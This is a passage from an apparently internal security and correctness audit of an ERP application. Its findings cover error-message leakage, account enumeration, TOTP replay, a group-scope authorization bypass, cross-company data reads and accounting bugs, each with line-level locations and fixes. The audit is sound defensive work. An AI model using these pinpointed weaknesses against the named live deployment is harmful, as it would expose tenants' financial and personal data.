**Fix (summary):** Add a strict per-route throttle on heavy endpoints, e.g. `@Throttle({ default: { limit: 5, ttl: 60000 } })` on list/report/render controller methods, or define a named 'heavy' tier in ThrottlerModule.forRoot, keeping 100/60s for normal CRUD. Best paired with the @Max limit cap (finding 1) and the regex fix (finding 2), which address the underlying per-request cost.

---

#### ITMB-088 — Prisma exception filter returns raw driver error text to clients in the default case

- **Severity:** low  •  **Confidence:** high  •  **Category:** Hardening / Information Disclosure
- **Location:** `backend/src/common/filters/prisma-exception.filter.ts:39`

**What & why:** For PrismaClientKnownRequestError codes other than the mapped P2002/P2025/P2003, the default branch sets message = exception.message.split('\n').pop() (L39) and returns it in the JSON body (L50-58). Prisma known-error messages can embed table/column/constraint names and other schema internals. This filter is @Catch(Prisma.PrismaClientKnownRequestError, ...) so it is the specific filter Nest routes Prisma errors to (registered alongside the catch-all HttpExceptionFilter), and the default-branch text reaches the caller verbatim. The P2002 branch (L28) additionally echoes the conflicting column name(s). Unlike HttpExceptionFilter, which scrubs and only logs server-side, this default path surfaces driver-derived text directly.

**Evidence:** prisma-exception.filter.ts L38-39: default: message = exception.message.split('\n').pop() ?? 'Database error'; returned in response body at L50-54.

**Impact:** Leaks database schema details (table/column/constraint names) to API callers on uncommon Prisma errors, aiding data-model reconnaissance. Bounded because the common codes are mapped to generic messages.

**Fix (summary):** In the default branch return a generic 'Database error' to the client and log the (scrubbed) exception.message server-side instead. Keep the P2025/P2003 mappings; consider a generic 'Duplicate value' for P2002 rather than echoing meta.target.

---

#### ITMB-089 — Field-level encryption derives the AES key with a hardcoded, source-committed scrypt salt

- **Severity:** low  •  **Confidence:** high  •  **Category:** Weak Crypto / Hardening
- **Location:** `backend/src/common/services/encryption.service.ts:50`

**What & why:** EncryptionService derives its AES-256-GCM key via crypto.scryptSync(secret, 'itemba-r-app-encryption-v1', 32) using a fixed salt committed in source (L50). The salt provides no per-deployment uniqueness and cannot rotate independently of the secret. This is an explicitly documented trade-off (deterministic key across replicas, see L9-26), and entropy genuinely lives in APP_ENCRYPTION_KEY: env.validation enforces it is set, >=32 chars (L45-46), and distinct from JWT/refresh secrets (env.validation.ts ~L186-193). GCM, the random 12-byte IV (L62), and auth-tag handling are correct. This is defense-in-depth only, not a cryptographic break.

**Evidence:** encryption.service.ts L48-50: scrypt with a fixed salt; this.key = crypto.scryptSync(secret, 'itemba-r-app-encryption-v1', 32);

**Impact:** If APP_ENCRYPTION_KEY is ever weak or leaks, the public constant salt adds no protection and the derived key is reproducible by anyone holding the secret, weakening at-rest protection for integration credentials and TOTP secrets. Real-world risk is limited by the strong-secret enforcement.

**Fix (summary):** Optionally source the salt from a separate per-deployment env var (e.g. APP_ENCRYPTION_SALT, with a documented fallback to the current constant so existing ciphertext still decrypts), or explicitly document that at-rest security rests solely on APP_ENCRYPTION_KEY strength. Do not change the constant in place without a migration path — existing rows are keyed to the current salt.

---

#### ITMB-090 — Account enumeration via registration ConflictException (only when public registration is enabled)

- **Severity:** low  •  **Confidence:** high  •  **Category:** authn
- **Location:** `backend/src/modules/auth/auth.service.ts:103`

**What & why:** register() throws ConflictException('Email already registered') when the email exists (auth.service.ts:102-103) — a distinguishable response that confirms whether an email is registered. The login path was deliberately hardened against enumeration via constantTimeVerify and uniform 'Invalid credentials' (auth.service.ts:149-153, 674-693) and password reset returns a generic message, but registration leaks the same fact plainly. This is gated by publicRegistrationEnabled() which defaults to false (ALLOW_PUBLIC_REGISTRATION; auth.service.ts:612-615; env.validation.ts:88), so it only applies where public registration is turned on.

**Evidence:** auth.service.ts:102-103 const existing = await this.prisma.user.findUnique({where:{email:dto.email}}); if (existing) throw new ConflictException('Email already registered'). Gated by publicRegistrationEnabled() default false (lines 612-615; env.validation.ts:88).

**Impact:** Where public registration is enabled, an attacker enumerates valid corporate accounts by attempting registration and observing 409 vs success, building a target list for phishing/credential stuffing — defeating the anti-enumeration effort applied to login and password reset. No impact while ALLOW_PUBLIC_REGISTRATION stays false (the default).

**Fix (summary):** If public registration is enabled, do not reveal existence on conflict: return the same generic 'check your email to complete registration' response and notify the existing user out-of-band, making the conflict response indistinguishable from a normal success. If registration is intended to be admin-only, keep ALLOW_PUBLIC_REGISTRATION=false and document it.

---

#### ITMB-091 — Support ticket reporter and comment-author names never render because backend queries omit the user relations

- **Severity:** low  •  **Confidence:** high  •  **Category:** field-mismatch/missing-include
- **Location:** `backend/src/modules/support-tickets/support-tickets.service.ts:24`

**What & why:** The Support backend never loads the user relations, so the names the UI tries to show are always absent. SupportTicketsService.findAll (line 24-29) and findMine (line 31-36) return raw supportTicket rows with no `include`; findOne (line 38-49) includes only `comments` with NO nested `user`; SupportTicketCommentsService.getComments (support-ticket-comments.service.ts:9-14) returns comments with no `user` include. The Prisma schema does define the relations (SupportTicket.reportedBy/assignedTo and SupportTicketComment.user, schema.prisma:126-128,136) and User.fullName (schema.prisma:44). NOTE: the frontend half of the original finding is INCORRECT — the frontend already reads `fullName`, not `name` (tickets/page.tsx:57 `t.reportedBy?.fullName || t.reportedBy?.email || '—'`; tickets/[id]/page.tsx:81 `c.user?.fullName || c.user?.email || 'System'`), and the detail page does not render reportedBy/assignedTo at all. The sole defect is the backend omission of the includes.

**Evidence:** support-tickets.service.ts:24-29 findAll and 31-36 findMine have no include; 38-49 findOne includes only `comments` (no user). support-ticket-comments.service.ts:9-14 getComments has no user include. Frontend already reads fullName: tickets/page.tsx:57, tickets/[id]/page.tsx:81.

**Impact:** On the All Tickets list, the reporter line always falls through to '—' (reportedBy object absent). On the ticket detail page, every comment author always shows 'System' (c.user absent). Staff cannot tell who reported a ticket or who wrote each comment. Not a crash — the frontend's `|| '—'`/`|| 'System'` fallbacks keep it stable — but it is a consistent display defect across the Support module.

**Fix (summary):** Add user-relation includes returning fullName/email in the backend only. In support-tickets.service.ts: findAll/findMine -> `include: { reportedBy: { select: { id: true, fullName: true, email: true } } }`; findOne -> add `reportedBy`/`assignedTo` selects plus `comments: { include: { user: { select: { id: true, fullName: true, email: true } } }, orderBy: { createdAt: 'asc' } }`. In support-ticket-comments.service.ts getComments -> `include: { user: { select: { id: true, fullName: true, email: true } } }`. No frontend change required.

---

#### ITMB-092 — My Tickets (and All Tickets / ticket detail) hang on a permanent 'Loading...' spinner when the initial fetch rejects

- **Severity:** low  •  **Confidence:** high  •  **Category:** unhandled-fetch-errors/infinite-spinner
- **Location:** `frontend/src/app/(dashboard)/support/tickets/me/page.tsx:24`

**What & why:** My Tickets load() (lines 24-30) is `fetch('/api/backend/support/tickets/me').then(r=>r.json()).then(d=>{ setTickets(unwrapList(d)); setLoading(false); })` with NO `.catch` and NO `.finally`; `setLoading(false)` runs only inside the success `.then`. If the browser fetch rejects (network down) or `r.json()` throws (the proxy streams the upstream body straight through with its upstream content-type at route.ts:61, so a non-JSON upstream error body parses-fails), the success handler never runs and the page is stuck on 'Loading...' forever with no error and no recovery short of a manual reload. create() (lines 36-46) also POSTs with no res.ok check, so submission failures are silently swallowed (modal closes, load() reruns). The same no-catch/no-finally pattern exists in the sibling All Tickets load() (tickets/page.tsx:21-28) and the ticket detail load() (tickets/[id]/page.tsx:36-46). NOTE: the proxy's own catch returns valid JSON (route.ts:38-41), so a proxy-generated 502 alone parses fine; the hang is triggered by a browser-level fetch rejection or a non-JSON upstream body.

**Evidence:** me/page.tsx:24-30 load() has no .catch/.finally and sets loading false only on success; line 36-46 create() has no res.ok check. tickets/page.tsx:21-28 and tickets/[id]/page.tsx:36-46 share the pattern.

**Impact:** A transient backend/network failure while opening these Support pages (reachable by any user) leaves a permanent spinner with no error state and no retry. New-ticket and new-comment failures are invisible to the user. Low severity (requires a fetch failure) but a real reliability gap on production pages, contrasting with repo pages that wrap loads in try/finally.

**Fix (summary):** Move `setLoading(false)` into `.finally()` and add a `.catch` that records an error to render, e.g. `fetch(...).then(r=>r.json()).then(d=>setTickets(unwrapList(d))).catch(()=>setError('Failed to load tickets')).finally(()=>setLoading(false));`. Apply to all three load() sites. In create()/addComment(), check `res.ok` and surface failures instead of silently closing. Purely additive, safe to apply live.

---

#### ITMB-093 — formatDateTime uses toLocaleDateString (which ignores hour/minute), so it drops the time and is identical to formatDate

- **Severity:** low  •  **Confidence:** high  •  **Category:** data-display/correctness
- **Location:** `frontend/src/lib/design-system/formatters.ts:56`

**What & why:** formatDateTime is documented to render a date WITH time ('25 Apr 2026, 14:32') and passes `hour: '2-digit', minute: '2-digit'`, but its body calls `new Date(value).toLocaleDateString('en-GB', {...})`. Date.prototype.toLocaleDateString formats only the date portion and silently ignores the hour/minute options, so the output is byte-for-byte identical to the sibling formatDate (line 39) and the time of day is dropped. The function is declared at line 53; the offending call is at line 56. Severity is low (not medium) because a repo-wide search confirms the shared helper is currently not imported by any page (existing timestamp call-sites use their own local formatters), so the defect is latent in the public design-system surface rather than already user-visible.

**Evidence:** Lines 53-66: `export function formatDateTime(...) { ... return new Date(value).toLocaleDateString('en-GB', { day:'2-digit', month:'short', year:'numeric', hour:'2-digit', minute:'2-digit' }); ... }` — toLocaleDateString ignores hour/minute; toLocaleString honors them.

**Impact:** Any code that later adopts this shared formatDateTime to show a timestamp will display only the calendar date and never the time, making two same-day events indistinguishable in an ERP that relies on knowing exactly when audit/document/transaction events occurred. The bug is silent because the output still looks like a valid date, and because it is the obvious 'date + time' helper exported from the barrel it is a trap for the next developer.

**Fix (summary):** Change `toLocaleDateString` to `toLocaleString` at line 56, keeping the same options (optionally add `hour12: false` for 24-hour output): `return new Date(value).toLocaleString('en-GB', { day:'2-digit', month:'short', year:'numeric', hour:'2-digit', minute:'2-digit', hour12:false });`. Add a unit test asserting the time portion renders. Safe, no behavioral change to formatDate.

---

#### ITMB-094 — d2286f9 makes GROUP scope an unconditional bypass that skips the requested AccessLevel in company-scope checks (defense-in-depth regression)

- **Severity:** low  •  **Confidence:** medium  •  **Category:** authz
- **Location:** `backend/src/common/services/company-scope.service.ts:122`

**What & why:** Commit d2286f9 ('Fix group admin draft authorization') added an early-return to both copies of the central tenant-scoping helper: assertCanAccessCompanyFromUser (company-scope.service.ts:38) and CompanyScopeService.assertCanAccessCompany (line 122) now do `if (companyId && isGroupScoped(user)) return;` BEFORE the AccessLevel rank check at lines 58-61 / 129-133. Net effect: any user whose roleScopes include 'GROUP' passes these checks for ANY companyId at ANY requested minimum (READ/WRITE/MANAGE) without consulting UserCompanyAccess or the AccessLevel. The accompanying spec was flipped to assert this resolves (company-scope.service.spec.ts:64-71 and 128-131). assertCanAccessCompany is called with AccessLevel.MANAGE by group-control, bank-accounts, loans, fixed-assets, contracts, business-licenses and debts services (e.g. group-control.service.ts:54,88), so the MANAGE gate is now a no-op for every GROUP-scoped role. GROUP_AUDITOR is seeded as strictly read-only (seed.ts:1451-1463, only .read/.view/.export permissions) yet would now clear the MANAGE company-scope check. In isolation this is not directly exploitable because those write endpoints are independently gated by @RequirePermissions (the .manage/.create permission guards still block GROUP_AUDITOR, which lacks those codes), so the AccessLevel layer is a redundant defense here — but it has been silently disabled and becomes load-bearing the moment a GROUP-scoped role is granted broad permissions (see the roles.create/roles.update escalation).

**Evidence:** git show d2286f9 added line 38 `if (companyId && isGroupScopedUser(user)) return;` and line 122 `if (companyId && this.isGroupScoped(user)) return;`, both BEFORE the ACCESS_RANK[minimum] check; company-scope.service.spec.ts:64-71,128-131 flipped to resolve for GROUP+company-2; isGroupScopedUser = roleScopes.includes('GROUP') (line 17-18); MANAGE callers at group-control.service.ts:54,88, bank-accounts.service.ts:71, loans.service.ts:60, fixed-assets.service.ts:66, contracts.service.ts:74, business-licenses.service.ts:64, debts.service.ts:70; GROUP_AUDITOR seeded read-only at seed.ts:1451-1463.

**Impact:** Removes a defense-in-depth layer: the per-company AccessLevel ceiling no longer constrains GROUP-scoped roles. A read-only group role passing a MANAGE check is no longer rejected by this helper; only the controller permission guard stops the write. Combined with the roles.create/roles.update finding (mint a GROUP-scoped role), this early-return becomes the cross-company MANAGE pathway with no AccessLevel ceiling.

**Fix (summary):** Do not treat GROUP scope as an unconditional AccessLevel bypass. Either (a) restrict the blanket bypass to a true super-admin (e.g. user.roles.includes('GROUP_SUPER_ADMIN')) instead of any roleScopes.includes('GROUP'), or (b) keep allowing GROUP-scoped users to target any company but still evaluate the requested minimum against the role's actual capability rather than returning early. Apply symmetrically to both assertCanAccessCompanyFromUser (line 38) and assertCanAccessCompany (line 122) and update the two flipped spec cases accordingly. This is safe for live behavior: GROUP_SUPER_ADMIN/GROUP_FINANCE_CONTROLLER retain MANAGE; read-only GROUP roles regain the intended ceiling.

---

#### ITMB-095 — helmet() applied with library defaults — HSTS/CSP not explicitly hardened, and Caddy adds no HSTS

- **Severity:** low  •  **Confidence:** medium  •  **Category:** Hardening / HTTP Security Headers
- **Location:** `backend/src/main.ts:28`

**What & why:** helmet() is invoked with no options (L28) and is not tuned per environment. Helmet's default HSTS is maxAge 180 days, includeSubDomains, no preload, and its default CSP is generic. The TLS-terminating Caddy proxy (deploy/caddy/Caddyfile) contains only reverse_proxy directives and adds no Strict-Transport-Security or CSP header (Caddy does not emit HSTS automatically). So the credentialed cross-origin API serving the live financial frontend relies entirely on Helmet defaults. Minor hardening gap, not a vulnerability on its own.

**Evidence:** main.ts L28: app.use(helmet()); no options, isProd not used for headers. deploy/caddy/Caddyfile L1-8: only reverse_proxy directives, no header block.

**Impact:** HSTS max-age is shorter than typically desired and not preloaded; CSP is not tailored to the deployed frontend, leaving header coverage weaker than intended for app.itembagrouptz.com.

**Fix (summary):** Configure helmet explicitly with prod-only strong HSTS, e.g. helmet({ hsts: isProd ? { maxAge: 31536000, includeSubDomains: true, preload: true } : false }), and a CSP tuned to the frontend; optionally also set headers at the Caddy layer. Move app.use(helmet()) below the isProd computation (already at L22).

---

#### ITMB-096 — Audit-adjustment post/reverse run the period-lock check outside the transaction, leaving a TOCTOU window to post into a concurrently-closed period

- **Severity:** low  •  **Confidence:** medium  •  **Category:** accounting-integrity
- **Location:** `backend/src/modules/audit-adjustments/audit-adjustments.service.ts:161`

**What & why:** In post() the call to this.accountingControl.assertPostingAllowed(...) is at lines 161-166 and the JournalEntry insert runs in this.prisma.$transaction at lines 168-207; in reverse() the check is at lines 226-231 and the transaction at lines 233-262. The lock/period state is read on a different connection than the one that writes the JournalEntry, and the period status / active locks are never re-checked inside the transaction. period-close.service.ts closes the period and creates the lock in its own transaction, which can interleave between the check and the insert.

**Impact:** If a period close commits between assertPostingAllowed and the audit-adjustment JE insert, the adjustment posts into a now-CLOSED/LOCKED period, bypassing the close control — exactly what the lock is meant to prevent for auditor adjustments. Window is narrow, hence low severity.

**Fix (summary):** Move the posting-allowed check inside the $transaction so it shares the writing connection: have AccountingControlService accept an optional Prisma.TransactionClient and re-read AccountingPeriod.status plus active AccountingPeriodLock rows within the tx immediately before tx.journalEntry.create. Apply to both post() and reverse().

---

#### ITMB-097 — Unbounded auditLog.findMany distinct scan in getEntityTypes (no take) on append-only table

- **Severity:** low  •  **Confidence:** medium  •  **Category:** DoS / Unbounded query
- **Location:** `backend/src/modules/audit-logs/audit-logs.service.ts:360`

**What & why:** getEntityTypes() (GET /audit-logs/entity-types, audit-logs.controller.ts L64-68) runs `this.prisma.auditLog.findMany({ where: { ...(user && companyWhereForUser(user)) }, distinct: ['entityType'], select: { entityType: true }, orderBy: { entityType: 'asc' } })` (L360-365) with NO `take`. Even though it selects one column and uses distinct, Postgres must scan/sort the entire (company-scoped) auditLog table to compute the distinct set; auditLog is append-only and grows without bound in production. The main paginated findAll on the same service is correctly bounded, so this is the residual gap.

**Evidence:** audit-logs.service.ts L360-365 findMany with distinct:['entityType'], select:{entityType:true}, orderBy, NO take. audit-logs.controller.ts L64-67 `@Get('entity-types')`.

**Impact:** Each call to the filter-dropdown endpoint triggers a full distinct scan/sort over the ever-growing audit table, holding a connection and burning Postgres CPU; cost grows with table size and the call is repeatable within the throttler budget. Low severity: small payload, single supporting endpoint.

**Fix (summary):** Back the dropdown with a bounded source — a small distinct-entity-type lookup, a short-lived cache (values change rarely), or at minimum a covering index on (companyId, entityType) so the distinct is index-only. Avoid an unbounded distinct scan on the hot path. Safe, read-only optimization.

---

#### ITMB-098 — Verified TOTP codes are not consumed — replay within the time-step window

- **Severity:** low  •  **Confidence:** medium  •  **Category:** authn
- **Location:** `backend/src/modules/auth/two-factor.service.ts:115`

**What & why:** verifyChallenge validates a TOTP via authenticator.verify({ token, secret }) (two-factor.service.ts:115) and returns success (line 117-119) without recording the accepted token/time-step. Unlike backup codes, which are marked usedAt and are single-use (lines 129-133), a successfully used TOTP is never invalidated. With the default 30s step (plus any default window tolerance) the same 6-digit code can be submitted more than once while still within its validity window.

**Evidence:** two-factor.service.ts:115-120 const totpValid = authenticator.verify({ token: code, secret }); if (totpValid) { ...logSecurityEvent; return true; } — no record of the used step; contrast backup-code single-use at lines 129-133.

**Impact:** A TOTP observed by an attacker (shoulder-surf, phishing relay, MITM of the challenge request) can be replayed to complete a second authentication before the time step rolls over, weakening the one-time guarantee of TOTP. Bounded by the short (~30s) validity window.

**Fix (summary):** Persist the last accepted TOTP counter/time-step per user (e.g. on UserSecurityProfile) and reject a code whose step is <= the last accepted step, making each TOTP single-use. Keep the verification window narrow (window: 0 or 1).

---

#### ITMB-099 — Debt has no payment endpoint; amountPaid set directly from client via free-form update with no validation, derived status, or money-movement audit

- **Severity:** low  •  **Confidence:** medium  •  **Category:** balance integrity / missing money movement
- **Location:** `backend/src/modules/debts/debts.service.ts:71`

**What & why:** The debts module exposes no recordPayment method (only findAll/create/update/findOne/remove/getSummary/getOverdue/getAuditHistory/getProductsSold). amountPaid and status are mutated only through the generic update() (lines 71-103), which sets `data.amountPaid = new Prisma.Decimal(dto.amountPaid)` directly when provided (lines 77-78) with no validation that it is <= amount, no derivation of an outstanding/remaining figure, and no status derived from the amounts (status is set only if the client passes dto.status, line 80). It logs a generic 'debt.update' audit action (line 93), not a money-movement action, and there is no transaction/lock around the amountPaid change and no journal entry.

**Evidence:** debts.service.ts methods listed at lines 23/44/71/98/111/127/156/181/207 contain no recordPayment. update() lines 77-78 `if (dto.amountPaid !== undefined) data.amountPaid = new Prisma.Decimal(dto.amountPaid);` with no <= amount check; audit action 'debt.update' at line 93.

**Impact:** Debt repayments are untracked as money movements: amountPaid can be set to any value (including exceeding the debt or being silently overwritten by a concurrent edit), status is not derived from amounts, and there is no settlement audit trail or GL entry, so reported debt balances are unreliable.

**Fix (summary):** Add a dedicated recordPayment(debtId, amount) that locks the debt row, validates amount <= outstanding (amount - amountPaid), increments amountPaid, derives status (PARTIALLY_PAID/SETTLED), logs a debt.payment audit action, and (if debts are in-ledger) posts a balanced settlement entry.

---

#### ITMB-100 — Depreciation findOne and getEntries enforce no company scope — cross-company read of depreciation/asset data

- **Severity:** low  •  **Confidence:** medium  •  **Category:** tenant isolation
- **Location:** `backend/src/modules/depreciation/depreciation.service.ts:49`

**What & why:** findOne(id) (lines 49-56) looks up a DepreciationSchedule by id only (where: { id, deletedAt: null }) with no companyId filter, no user, and no assertCanAccessCompany, and the controller's GET :id (depreciation.controller.ts:18-22) calls it with no @CurrentUser. getEntries(scheduleId) (lines 58-64) similarly returns all entries for any schedule id without any scope check, and its controller route (depreciation.controller.ts:24-28) also passes no user. Unlike findAll (line 40), which applies applyCompanyScopeWhere, these by-id reads let any authenticated user holding the generic depreciation.view permission read another company's depreciation schedule (with included asset) and entries by enumerating ids.

**Evidence:** Line 50 `this.prisma.depreciationSchedule.findFirst({ where: { id, deletedAt: null }, include: { entries: true, asset: true } })` with no company filter; controller findOne at depreciation.controller.ts:20 takes no @CurrentUser; getEntries at line 59 filters only by scheduleId/deletedAt.

**Impact:** Cross-tenant disclosure of another company's depreciation schedules, included asset, and entry amounts/accumulated depreciation to any authenticated user with the depreciation.view permission, violating Group->Company isolation.

**Fix (summary):** Pass the AuthUser into findOne/getEntries and call companyScope.assertCanAccessCompany(user, schedule.companyId) (resolving the entry's schedule.companyId in getEntries), mirroring postEntry which already scopes via assertCanAccessCompany at line 77 and findAll which uses applyCompanyScopeWhere.

---

#### ITMB-101 — Leave balance year derived from start date only — a year-spanning leave is charged entirely to the start year

- **Severity:** low  •  **Confidence:** medium  •  **Category:** leave-balance
- **Location:** `backend/src/modules/hr/leave-requests/leave-requests.service.ts:333`

**What & why:** applyLeaveBalanceUsage() uses `const year = startDate.getUTCFullYear();` (line ~333) and decrements that single year's LeaveBalance by the full request.totalDays. reverseLeaveBalanceUsage() mirrors the same single-year logic (only 2 getUTCFullYear occurrences in the file, one per function), so reversal is consistent but a request straddling Dec/Jan still charges all days to the prior year.

**Evidence:** leave-requests.service.ts:~333 `const year = startDate.getUTCFullYear();` then full totalDays applied to that one year; grep confirms exactly 2 getUTCFullYear occurrences (apply + reverse).

**Impact:** Annual leave entitlement accounting is wrong across the year boundary: the start year is over-consumed (and can fail the available-balance check) while the new year is untouched, distorting carry-forward/accrual. Low severity — only affects year-spanning requests.

**Fix (summary):** Split totalDays across the calendar years the request spans and decrement each year proportionally in both apply and reverse, or define and consistently enforce an explicit single-year policy.

---

#### ITMB-102 — No cancel path reverses an already-approved leave — balance only restored via delete

- **Severity:** low  •  **Confidence:** medium  •  **Category:** leave-balance
- **Location:** `backend/src/modules/hr/leave-requests/leave-requests.service.ts:276`

**What & why:** reverseLeaveBalanceUsage() has exactly one caller (remove(), reversing only when status was APPROVED). reject() is guarded to status SUBMITTED and update() blocks editing approved requests, and there is no cancel endpoint (zero 'cancel' references in the service or controller). So once APPROVED, the only way to return the days is the delete endpoint.

**Evidence:** leave-requests.service.ts: grep shows reverseLeaveBalance referenced exactly twice (definition + single caller in remove()), and 0 occurrences of 'cancel' in both the service and the controller.

**Impact:** Any void path other than delete leaves usedDays permanently consumed, eventually blocking legitimate requests with a false 'Insufficient leave balance'. Low severity because delete does reverse correctly.

**Fix (summary):** Add an explicit cancel-approved endpoint that runs reverseLeaveBalanceUsage() inside a transaction, and ensure any status transition away from APPROVED restores the balance.

---

#### ITMB-103 — SDL exemption uses the live active-employee count at recalculation time, not the headcount during the payroll period

- **Severity:** low  •  **Confidence:** medium  •  **Category:** statutory-cap-threshold
- **Location:** `backend/src/modules/hr/payroll-runs/payroll-runs.service.ts:148`

**What & why:** payroll-runs.calculate() sets `const companyEmployeeCount = employees.length` (line 148) from the current count of ACTIVE employees with an ACTIVE assignment (query lines 132-143), and passes it via buildInput (line 155) into calculate(). calculators.ts calculateSdl (lines 61-67) suppresses SDL when companyEmployeeCount < SDL_EMPLOYEE_COUNT_THRESHOLD (10). The count is the live headcount at the moment of (re)calculation, not the headcount during the payroll period. Combined with the lack of period awareness, a company that crosses the 10-employee threshold mid-year will, on any re-run of a prior month, apply today's threshold decision to that old period.

**Impact:** Re-running or back-dating payroll can apply SDL (3.5% of gross, employer cost) to a month when the employer was below the 10-employee exemption, or omit SDL for a month it was above — producing an SDL figure that does not match the actual period liability. Low severity: only bites on re-runs that span a headcount threshold crossing.

**Fix (summary):** Snapshot the active-employee count as-of the payroll period (employees with active assignments during [periodStart, periodEnd]) and persist it on PayrollRun so SDL eligibility is deterministic and period-correct on recomputation. Until then, restrict recalculation of finalized prior-month runs.

---

#### ITMB-104 — WAC: cost-less inbound movement values added quantity at the existing average cost, silently inflating totalValue

- **Severity:** low  •  **Confidence:** medium  •  **Category:** valuation
- **Location:** `backend/src/modules/inventory-movements/inventory-movements.service.ts:234`

**What & why:** In applyMovementToBalance(), newAvgCost is only recomputed when the movement is inbound AND movement.unitCost != null (lines 235-239). For an inbound movement WITHOUT a unitCost (e.g. OPENING_STOCK, SALES_RETURN, TRANSFER_IN, PRODUCTION_IN/ADJUSTMENT_IN when no cost basis is supplied), newAvgCost stays equal to the existing average and totalValue is then written as newQty * newAvgCost (via upsertBalance line 271). The added quantity is thus implicitly valued at the current average cost even though no cost basis was supplied, inflating totalValue with no real cost input. (Note: stock-adjustments DOES forward line.unitCost when present at stock-adjustments.service.ts:288, so only adjustments with a null line unitCost hit this path.)

**Evidence:** let newAvgCost = Number(existing?.average_cost ?? 0); if (movement.unitCost != null) { const totalCost = Number(existing?.total_value ?? 0) + quantity * Number(movement.unitCost); newAvgCost = newQty > 0 ? totalCost / newQty : 0; } await this.upsertBalance(client, movement, newQty, newAvgCost); // upsertBalance: totalValue = newQty * newAvgCost

**Impact:** Stored InventoryBalance.totalValue and averageCost drift from true cost whenever cost-less inbound movements occur, feeding wrong COGS and inventory valuation downstream.

**Fix (summary):** Define an explicit policy for cost-less inbound movements: require/forward a unitCost for cost-bearing inbound types, or when unitCost is null compute the added value deliberately (e.g. explicitly value the new units at the current average and document the convention) rather than relying on the implicit recompute. Document the intended valuation behaviour.

---

#### ITMB-105 — loans create() accepts unvalidated numeric strings for principalAmount/interestRate/outstandingBalance and client-settable status

- **Severity:** low  •  **Confidence:** medium  •  **Category:** input-validation
- **Location:** `backend/src/modules/loans/dto/create-loan.dto.ts:22`

**What & why:** CreateLoanDto validates principalAmount/interestRate/outstandingBalance with only @IsString (create-loan.dto.ts:22,24,29) — not even @IsNumberString — so any string is accepted, with no positivity/@Min check and no cross-field check that outstandingBalance <= principalAmount. status is client-settable via @IsOptional @IsEnum(LoanStatus) (line 30). The service (loans.service.ts:117+) correctly scopes the company (assertCanAccessCompany at :125) and maps fields explicitly (not a blind spread), wrapping the values in new Prisma.Decimal(...) and persisting dto.status. A non-numeric principal/outstanding string would throw at new Prisma.Decimal(), but negative or absurdly large numeric strings, and a terminal initial status, pass through. Tenant scoping is enforced, so impact is limited to data quality.

**Evidence:** DTO:22 @IsNotEmpty() @IsString() principalAmount!: string; :24 @IsNotEmpty() @IsString() interestRate!: string; :29 @IsNotEmpty() @IsString() outstandingBalance!: string; :30 @IsOptional() @IsEnum(LoanStatus) status?: LoanStatus. service:147,154,155 new Prisma.Decimal(dto.principalAmount), new Prisma.Decimal(dto.outstandingBalance), status: dto.status.

**Impact:** A loan can be created with a negative or absurd principal/outstanding balance, or instantiated directly in a terminal status (e.g. CLOSED/DEFAULTED), skewing liabilities reporting and risk dashboards.

**Fix (summary):** Use @IsNumberString (or @IsDecimal) plus a positivity/@Min constraint on principalAmount/outstandingBalance, bound interestRate to a sane range, add a cross-field check outstandingBalance <= principalAmount, and default status to ACTIVE at creation (status changes only via the existing mark-loan-status endpoint).

---

#### ITMB-106 — CIT and City Service Levy silently fall back to hardcoded rates when no effective TaxRate row covers the period

- **Severity:** low  •  **Confidence:** medium  •  **Category:** rate-fallback
- **Location:** `backend/src/modules/tax-filing-engine/tax-filing-engine.service.ts:230`

**What & why:** computeCorporateIncomeTax (lines 218-236) and computeServiceLevy (lines 241-259) date-bound the TaxRate lookup correctly (effectiveFrom <= periodEnd, effectiveTo null/>= periodStart), but when the lookup returns nothing they book a draft return at a hardcoded constant: CIT `const ratePct = rateRow ? Number(rateRow.rate) : 30` (line 230) and Service Levy `const ratePct = rateRow ? Number(rateRow.rate) : 0.3` (line 253, divided by 100 => 0.3%). If the TaxRate seed is missing or its effective window does not cover the period, the engine produces a plausible-looking return at a constant rate instead of refusing, masking a configuration gap. Partially mitigated: the fallback IS recorded in the returned assumptions array ('Used statutory default CIT rate 30%' line 235; 'Used default service levy rate 0.3%' line 258), so it is not fully silent, and operator review is required before submission.

**Impact:** A missing or mis-dated TaxRate yields an un-governed draft return at a fixed rate rather than an explicit error. If TRA changes the CIT rate or a council uses a non-0.3% service levy, the fallback produces a wrong figure an operator could submit. Low severity given the emitted assumptions note and mandatory operator review.

**Fix (summary):** On a missing date-bounded rate, surface a blocking validation/warning (or throw notSupported, as other categories do) rather than silently defaulting, so the operator must configure the rate before the return can be submitted. Reserve the numeric default for an explicit override flag.

---

#### ITMB-107 — BankAccount uniqueness is global ([bankName, accountNumber]) instead of scoped to the owning company/group

- **Severity:** low  •  **Confidence:** medium  •  **Category:** wrong-unique-scope
- **Location:** `database/prisma/schema.prisma:1389`

**What & why:** BankAccount (model at L1357) is a sensitive, owner-scoped record: companyId (L1360), divisionId, branchId, and groupId (L1364) are all nullable so an account belongs either to a specific company or to the group. Its sole uniqueness constraint is `@@unique([bankName, accountNumber])` (L1389) -- a GLOBAL key across the whole database, not prefixed by the owner. This deviates from the otherwise consistent per-company composite-unique pattern used by every other owned entity (JournalEntry `@@unique([companyId, journalNumber])` L2011, Customer `@@unique([companyId, customerCode])` L2521, and similarly RentInvoice/SupplierInvoice/SalaryPayment/etc.). The application layer does NOT compensate: BankAccountsService.create (backend/src/modules/bank-accounts/bank-accounts.service.ts L98-129) performs no duplicate pre-check and inserts directly, so the DB constraint at L1389 is the only thing enforcing uniqueness, and it does so globally. Relations (L1382-1385, company onDelete: Restrict) and FK indexes (L1390-1393) are correct, so this is purely a uniqueness-scope nuance -- not a missing FK, soft-delete, or data-type defect.

**Impact:** Two different companies (or a company and the group) cannot each register the same (bankName, accountNumber) pair; the second insert fails at the DB with a unique-constraint violation (surfaced as an unhandled Prisma P2002, since there is no app-level ConflictException). In practice bank account numbers are globally distinct within a bank, so cross-tenant collisions on the same physical account are usually intentional duplicates worth blocking; only mirror/shadow bookkeeping records or reused internal numbering across tenants would hit a false-positive. Also note the constraint does NOT include deletedAt, so a soft-deleted row still blocks re-creating the same account. Low severity and rare.

**Fix (summary):** Only change this if per-owner accounts must be independently unique. Decide intended semantics first. Option A (per-company): replace with `@@unique([companyId, bankName, accountNumber])` -- but note Postgres treats NULLs as distinct, so pure group-level accounts (companyId null) would no longer be deduplicated by this key; add a partial unique index for group-level rows if needed. Option B: keep the global constraint if global distinctness is genuinely desired. Either way, add an explicit duplicate pre-check in BankAccountsService.create that throws a ConflictException so users get a clean error instead of a raw P2002. Before any migration on the live DB, query for existing rows that would violate the new key (and consider soft-deleted rows) so the migration does not fail.

---

